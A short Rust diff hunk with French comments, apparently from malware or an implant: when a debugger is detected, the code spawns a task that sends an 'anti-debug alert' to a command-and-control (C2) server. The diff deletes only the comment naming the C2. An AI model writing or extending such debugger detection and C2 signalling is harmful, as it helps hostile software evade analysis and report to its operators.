@@ -221,7 +221,7 @@ pub fn anti_debug_response() {
 
     if detect_debugging() {
         debug_log("Débogueur détecté! (mais le programme continue)");
-        // Envoi d'une alerte au C2
+        
         tokio::spawn(async {
             let _ = crate::connexion::send_anti_debug_alert().await;
         });
